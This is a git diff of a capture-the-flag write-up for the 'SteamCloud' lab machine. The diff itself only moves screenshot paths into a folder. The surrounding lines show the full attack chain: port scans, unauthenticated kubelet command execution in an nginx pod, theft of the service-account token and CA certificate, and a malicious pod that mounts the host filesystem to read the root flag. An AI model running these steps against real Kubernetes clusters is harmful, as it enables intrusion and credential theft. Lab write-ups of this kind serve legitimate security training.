@@ -40,7 +40,7 @@ Check if the host is alive using ICMP:
 ping -c 1 10.129.96.167
 ```
 
-![ping](steamcloud_01_ping.png)
+![ping](screenshots/steamcloud_01_ping.png)
 
 ---
 ### 1.2 Port Scanning
@@ -51,7 +51,7 @@ Scan all TCP ports to identify open services:
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.96.167 -oG allPorts
 ```
 
-![allports](steamcloud_02_nmap_allports.png)
+![allports](screenshots/steamcloud_02_nmap_allports.png)
 
 Extract the open ports:
 
@@ -59,7 +59,7 @@ Extract the open ports:
 extractPorts allPorts
 ```
 
-![extractports](steamcloud_03_extractports.png)
+![extractports](screenshots/steamcloud_03_extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -71,8 +71,8 @@ nmap -sCV -p22,2379,2380,8443,10249,10250,10256 10.129.96.167 -oN targeted
 cat targeted
 ```
 
-![targeted](steamcloud_04_nmap_targeted.png)
-![targeted_full](steamcloud_05_targeted_full_output.png)
+![targeted](screenshots/steamcloud_04_nmap_targeted.png)
+![targeted_full](screenshots/steamcloud_05_targeted_full_output.png)
 
 **Findings:**
 
@@ -96,7 +96,7 @@ curl -k https://10.129.96.167:8443/
 curl -k https://10.129.96.167:8443/version
 ```
 
-![k8s_api](steamcloud_06_k8s_api_forbidden_and_version.png)
+![k8s_api](screenshots/steamcloud_06_k8s_api_forbidden_and_version.png)
 
 The API required authentication for most paths, so I pivoted to kubelet enumeration.
 
@@ -110,8 +110,8 @@ kubeletctl -s 10.129.96.167 pods
 kubeletctl -s 10.129.96.167 scan rce
 ```
 
-![kubelet_pods](steamcloud_07_kubeletctl_pods.png)
-![kubelet_scan_rce](steamcloud_08_kubeletctl_scan_rce.png)
+![kubelet_pods](screenshots/steamcloud_07_kubeletctl_pods.png)
+![kubelet_scan_rce](screenshots/steamcloud_08_kubeletctl_scan_rce.png)
 
 The `nginx` pod in the `default` namespace was RCE-capable, so I used it for initial access.
 
@@ -128,7 +128,7 @@ kubeletctl -s 10.129.96.167 exec "hostname -I" -p nginx -c nginx
 kubeletctl -s 10.129.96.167 exec "bash" -p nginx -c nginx
 ```
 
-![nginx_exec](steamcloud_09_kubeletctl_exec_nginx.png)
+![nginx_exec](screenshots/steamcloud_09_kubeletctl_exec_nginx.png)
 
 From within the container, I found and read `user.txt`:
 
@@ -137,7 +137,7 @@ cd /root
 cat user.txt
 ```
 
-![user_flag](steamcloud_10_user_flag.png)
+![user_flag](screenshots/steamcloud_10_user_flag.png)
 
 ðŸ **User flag obtained**
 
@@ -152,8 +152,8 @@ kubeletctl -s 10.129.96.167 -p nginx -c nginx exec "cat /run/secrets/kubernetes.
 kubeletctl -s 10.129.96.167 -p nginx -c nginx exec "cat /run/secrets/kubernetes.io/serviceaccount/ca.crt" > ca.crt
 ```
 
-![sa_dump](steamcloud_11_serviceaccount_dump.png)
-![sa_files](steamcloud_12_token_and_ca_files.png)
+![sa_dump](screenshots/steamcloud_11_serviceaccount_dump.png)
+![sa_files](screenshots/steamcloud_12_token_and_ca_files.png)
 
 With these, I could authenticate to the API and enumerate permissions:
 
@@ -163,9 +163,9 @@ kubectl -s https://10.129.96.167:8443 --certificate-authority=ca.crt --token="$(
 kubectl -s https://10.129.96.167:8443 --certificate-authority=ca.crt --token="$(cat token)" get pod nginx -o yaml
 ```
 
-![kubectl_get_pods](steamcloud_13_kubectl_get_pods.png)
-![rbac](steamcloud_14_kubectl_auth_can_i_list.png)
-![nginx_yaml](steamcloud_15_kubectl_get_pod_nginx_yaml.png)
+![kubectl_get_pods](screenshots/steamcloud_13_kubectl_get_pods.png)
+![rbac](screenshots/steamcloud_14_kubectl_auth_can_i_list.png)
+![nginx_yaml](screenshots/steamcloud_15_kubectl_get_pod_nginx_yaml.png)
 
 The RBAC output showed I could **get/create/list pods** in `default`, which enabled the privesc path.
 
@@ -181,8 +181,8 @@ cat evil.yaml
 kubectl -s https://10.129.96.167:8443 --certificate-authority=ca.crt --token="$(cat token)" apply -f evil.yaml
 ```
 
-![evil_yaml](steamcloud_16_evil_yaml.png)
-![evil_apply](steamcloud_17_kubectl_apply_evil_pod.png)
+![evil_yaml](screenshots/steamcloud_16_evil_yaml.png)
+![evil_apply](screenshots/steamcloud_17_kubectl_apply_evil_pod.png)
 
 I verified the new pod existed and remained exec-capable via kubelet:
 
@@ -191,7 +191,7 @@ kubeletctl -s 10.129.96.167 pods
 kubeletctl -s 10.129.96.167 scan rce
 ```
 
-![evil_visible](steamcloud_18_evil_pod_visible_and_rce.png)
+![evil_visible](screenshots/steamcloud_18_evil_pod_visible_and_rce.png)
 
 ---
 ### 4.2 Root access via host filesystem mount
@@ -204,7 +204,7 @@ cd /mnt/root
 cat root.txt
 ```
 
-![root_flag](steamcloud_19_root_flag.png)
+![root_flag](screenshots/steamcloud_19_root_flag.png)
 
 ðŸ **Root flag obtained**
 
